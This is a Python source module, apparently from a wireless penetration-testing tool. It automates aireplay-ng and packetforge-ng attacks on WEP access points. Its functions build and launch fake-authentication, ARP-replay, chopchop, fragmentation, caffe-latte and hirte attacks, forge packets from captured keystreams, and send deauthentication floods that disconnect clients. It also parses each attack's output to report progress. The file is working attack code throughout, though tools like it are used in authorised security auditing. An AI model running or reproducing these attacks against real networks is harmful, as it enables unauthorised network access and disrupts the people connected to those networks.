#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Configuration import Configuration
from Process import Process
from Timer import Timer

import os, time, re
from threading import Thread

class WEPAttackType(object):
    ''' Enumeration of different WEP attack types '''
    fakeauth     = 0
    replay       = 1
    chopchop     = 2
    fragment     = 3
    caffelatte   = 4
    p0841        = 5
    hirte        = 6
    forgedreplay = 7

    def __init__(self, var):
        '''
            Sets appropriate attack name/value given an input.
            Args:
                var - Can be a string, number, or WEPAttackType object
                      This object's name & value is set depending on var.
        '''
        self.value = None
        self.name = None
        if type(var) == int:
            for (name,value) in WEPAttackType.__dict__.iteritems():
                if type(value) == int:
                    if value == var:
                        self.name = name
                        self.value = value
                        return
            raise Exception("Attack number %d not found" % var)
        elif type(var) == str:
            for (name,value) in WEPAttackType.__dict__.iteritems():
                if type(value) == int:
                    if name == var:
                        self.name = name
                        self.value = value
                        return
            raise Exception("Attack name %s not found" % var)
        elif type(var) == WEPAttackType:
            self.name = var.name
            self.value = var.value
        else:
            raise Exception("Attack type not supported")

    def __str__(self):
        return self.name


class Aireplay(Thread):
    def __init__(self, target, attack_type, client_mac=None, replay_file=None):
        '''
            Starts aireplay process.
            Args:
                target - Instance of Target object, AP to attack.
                attack_type - str, e.g. "fakeauth", "arpreplay", etc.
                client_mac - MAC address of an associated client.
        '''
        super(Aireplay, self).__init__() # Init the parent Thread

        self.target = target
        self.output_file = Configuration.temp("aireplay_%s.output" % attack_type)
        self.attack_type = WEPAttackType(attack_type).value
        self.error = None
        self.status = None
        self.cmd = Aireplay.get_aireplay_command(self.target,
                                            attack_type,
                                            client_mac=client_mac,
                                            replay_file=replay_file)
        self.pid = Process(self.cmd,
                stdout=open(self.output_file, 'a'),
                stderr=Process.devnull(),
                cwd=Configuration.temp())
        self.start()

    def is_running(self):
        return self.pid.poll() == None

    def stop(self):
        ''' Stops aireplay process '''
        if hasattr(self, "pid") and self.pid and self.pid.poll() == None:
            self.pid.interrupt()

    def get_output(self):
        ''' Returns stdout from aireplay process '''
        return self.pid.stdout()

    def run(self):
        while self.pid.poll() is None:
            time.sleep(0.1)
            if not os.path.exists(self.output_file): continue
            # Read output file
            f = open(self.output_file, "r")
            lines = f.read()
            f.close()
            # Clear output file
            f = open(self.output_file, "w")
            f.write("")
            f.close()
            for line in lines.split("\n"):
                line = line.replace("\r", "").strip()
                if line == "": continue
                if "Notice: got a deauth/disassoc packet" in line:
                    self.error = "Not associated (needs fakeauth)"

                if self.attack_type == WEPAttackType.fakeauth:
                    # Look for fakeauth status. Potential Output lines:
                    # (START): 00:54:58  Sending Authentication Request (Open System)
                    if "Sending Authentication Request " in line:
                        self.status = None # Reset
                    # (????):  Please specify an ESSID (-e).
                    elif "Please specify an ESSID" in line:
                        self.status = None
                    # (FAIL):  00:57:43  Got a deauthentication packet! (Waiting 3 seconds)
                    elif "Got a deauthentication packet!" in line:
                        self.status = False
                    # (PASS):  20:17:25  Association successful :-) (AID: 1)
                    # (PASS):  20:18:55  Reassociation successful :-) (AID: 1)
                    elif "association successful :-)" in line.lower():
                        self.status = True
                elif self.attack_type == WEPAttackType.chopchop:
                    # Look for chopchop status. Potential output lines:
                    # (START)  Read 178 packets...
                    read_re = re.compile(r"Read (\d+) packets")
                    matches = read_re.match(line)
                    if matches:
                        self.status = "Waiting for packet (read %s)..." % matches.group(1)
                    # (DURING) Offset   52 (54% done) | xor = DE | pt = E0 |  152 frames written in  2782ms
                    offset_re = re.compile(r"Offset.*\(\s*(\d+%) done\)")
                    matches = offset_re.match(line)
                    if matches:
                        self.status = "Generating Xor (%s)" % matches.group(1)
                    # (DONE)   Saving keystream in replay_dec-0516-202246.xor
                    saving_re = re.compile(r"Saving keystream in (.*\.xor)")
                    matches = saving_re.match(line)
                    if matches:
                        self.status = matches.group(1)
                    pass
                elif self.attack_type == WEPAttackType.fragment:
                    # TODO: Parse fragment output, update self.status
                    # 01:08:15  Waiting for a data packet...
                    # 01:08:17  Sending fragmented packet
                    # 01:08:37  Still nothing, trying another packet...
                    # XX:XX:XX  Trying to get 1500 bytes of a keystream
                    # XX:XX:XX  Got RELAYED packet!!
                    # XX:XX:XX  Thats our ARP packet!
                    # XX:XX:XX  Saving keystream in fragment-0124-161129.xor
                    # XX:XX:XX  Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
                    pass
                else: # Replay, forged replay, etc.
                    # Parse Packets Sent & PacketsPerSecond. Possible output lines:
                    # Read 55 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
                    # Read 4467 packets (got 1425 ARP requests and 1417 ACKs), sent 1553 packets...(100 pps)
                    read_re = re.compile(r"Read (\d+) packets \(got (\d+) ARP requests and (\d+) ACKs\), sent (\d+) packets...\((\d+) pps\)")
                    matches = read_re.match(line)
                    if matches:
                        pps = matches.group(5)
                        if pps == "0":
                            self.status = "Waiting for packet..."
                        else:
                            self.status = "Replaying packet @ %s/sec" % pps
                    pass

    def __del__(self):
        self.stop()

    @staticmethod
    def get_aireplay_command(target, attack_type,
                             client_mac=None, replay_file=None):
        '''
            Generates aireplay command based on target and attack type
            Args:
                target      - Instance of Target object, AP to attack.
                attack_type - int, str, or WEPAttackType instance.
                client_mac  - MAC address of an associated client.
                replay_file - .Cap file to replay via --arpreplay
        '''

        # Interface is required at this point
        Configuration.initialize()
        if Configuration.interface == None:
            raise Exception("Wireless interface must be defined (-i)")

        cmd = ["aireplay-ng"]
        cmd.append("--ignore-negative-one")

        if not client_mac and len(target.clients) > 0:
            # Client MAC wasn't specified, but there's an associated client. Use that.
            client_mac = target.clients[0].station

        # type(attack_type) might be str, int, or WEPAttackType.
        # Find the appropriate attack enum.
        attack_type = WEPAttackType(attack_type).value

        if attack_type == WEPAttackType.fakeauth:
            cmd.extend([
                "--fakeauth", "30", # Fake auth every 30 seconds
                "-Q", # Send re-association packets
                "-a", target.bssid
            ])
            if target.essid_known:
                cmd.extend(["-e", target.essid])
        elif attack_type == WEPAttackType.replay:
            cmd.extend([
                "--arpreplay",
                "-b", target.bssid,
                "-x", str(Configuration.wep_pps)
            ])
            if client_mac:
                cmd.extend(["-h", client_mac])

        elif attack_type == WEPAttackType.chopchop:
            cmd.extend([
                "--chopchop",
                "-b", target.bssid,
                "-x", str(Configuration.wep_pps),
                #"-m", "60", # Minimum packet length (bytes)
                #"-n", "82", # Maximum packet length
                "-F"        # Automatically choose first packet
            ])
            if client_mac:
                cmd.extend(["-h", client_mac])

        elif attack_type == WEPAttackType.fragment:
            cmd.extend([
                "--fragment",
                "-b", target.bssid,
                "-x", str(Configuration.wep_pps),
                "-m", "100", # Minimum packet length (bytes)
                "-F"         # Automatically choose first packet
            ])
            if client_mac:
                cmd.extend(["-h", client_mac])

        elif attack_type == WEPAttackType.caffelatte:
            if len(target.clients) == 0:
                # Unable to carry out caffe-latte attack
                raise Exception("Client is required for caffe-latte attack")
            cmd.extend([
                "--caffe-latte",
                "-b", target.bssid,
                "-h", target.clients[0].station
            ])

        elif attack_type == WEPAttackType.p0841:
            cmd.extend([
                "--arpreplay",
                "-b", target.bssid,
                "-c", "ff:ff:ff:ff:ff:ff",
                "-x", str(Configuration.wep_pps),
                "-F", # Automatically choose first packet
                "-p", "0841"
            ])
            if client_mac:
                cmd.extend(["-h", client_mac])

        elif attack_type == WEPAttackType.hirte:
            if client_mac == None:
                # Unable to carry out hirte attack
                raise Exception("Client is required for hirte attack")
            cmd.extend([
                "--cfrag",
                "-h", client_mac
            ])
        elif attack_type == WEPAttackType.forgedreplay:
            if client_mac == None or replay_file == None:
                raise Exception("Client_mac and Replay_File are required for arp replay")
            cmd.extend([
                "--arpreplay",
                "-b", target.bssid,
                "-h", client_mac,
                "-r", replay_file,
                "-F", # Automatically choose first packet
                "-x", str(Configuration.wep_pps)
            ])
        else:
            raise Exception("Unexpected attack type: %s" % attack_type)

        cmd.append(Configuration.interface)
        return cmd

    @staticmethod
    def get_xor():
        ''' Finds the last .xor file in the directory '''
        xor = None
        for fil in os.listdir(Configuration.temp()):
            if fil.startswith('replay_') and fil.endswith('.xor') or \
               fil.startswith('fragment-') and fil.endswith('.xor'):
                xor = fil
        return xor

    @staticmethod
    def forge_packet(xor_file, bssid, station_mac):
        ''' Forges packet from .xor file '''
        forged_file = 'forged.cap'
        cmd = [
            'packetforge-ng',
            '-0',
            '-a', bssid,           # Target MAC
            '-h', station_mac,     # Client MAC
            '-k', '192.168.1.2',   # Dest IP
            '-l', '192.168.1.100', # Source IP
            '-y', xor_file,        # Read PRNG from .xor file
            '-w', forged_file,     # Write to
            Configuration.interface
        ]

        cmd = '"%s"' % '" "'.join(cmd)
        (out, err) = Process.call(cmd, cwd=Configuration.temp(), shell=True)
        if out.strip() == 'Wrote packet to: %s' % forged_file:
            return forged_file
        else:
            from Color import Color
            Color.pl('{!} {R}failed to forge packet from .xor file{W}')
            Color.pl('output:\n"%s"' % out)
            return None

    @staticmethod
    def deauth(target_bssid, essid=None, client_mac=None, num_deauths=None, timeout=2):
        num_deauths = num_deauths or Configuration.num_deauths
        deauth_cmd = [
            "aireplay-ng",
            "-0", # Deauthentication
            str(num_deauths),
            "--ignore-negative-one",
            "-a", target_bssid, # Target AP
            "-D" # Skip AP detection
        ]
        if client_mac is not None:
            # Station-specific deauth
            deauth_cmd.extend(["-c", client_mac])
        if essid:
            deauth_cmd.extend(["-e", essid])
        deauth_cmd.append(Configuration.interface)
        proc = Process(deauth_cmd)
        while proc.poll() is None:
            if proc.running_time() >= timeout:
                proc.interrupt()
            time.sleep(0.2)

    @staticmethod
    def fakeauth(target, timeout=5, num_attempts=3):
        '''
        Tries a one-time fake-authenticate with a target AP.
        Params:
            target (py.Target): Instance of py.Target
            timeout (int): Time to wait for fakeuth to succeed.
            num_attempts (int): Number of fakeauth attempts to make.
        Returns:
            (bool): True if fakeauth succeeds, otherwise False
        '''

        cmd = [
            'aireplay-ng',
            '-1', '0', # Fake auth, no delay
            '-a', target.bssid,
            '-T', str(num_attempts)
        ]
        if target.essid_known:
            cmd.extend(['-e', target.essid])
        cmd.append(Configuration.interface)
        fakeauth_proc = Process(cmd,
                devnull=False,
                cwd=Configuration.temp())

        timer = Timer(timeout)
        while fakeauth_proc.poll() is None and not timer.ended():
            time.sleep(0.1)
        if fakeauth_proc.poll() is None or timer.ended():
            fakeauth_proc.interrupt()
            return False
        output = fakeauth_proc.stdout()
        return 'association successful' in output.lower()

if __name__ == '__main__':
    t = WEPAttackType(4)
    print t.name, type(t.name), t.value
    t = WEPAttackType('caffelatte')
    print t.name, type(t.name), t.value

    t = WEPAttackType(t)
    print t.name, type(t.name), t.value

    from Target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e, WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    t = Target(fields)

    '''
    aireplay = Aireplay(t, 'replay')
    while aireplay.is_running():
        from time import sleep
        sleep(0.1)
    print aireplay.get_output()
    '''

    '''
    forge = Aireplay.forge_packet('/tmp/replay_dec-0605-060243.xor', \
                                  'A4:2B:8C:16:6B:3A', \
                                  '00:C0:CA:4E:CA:E0')
    print forge
    '''
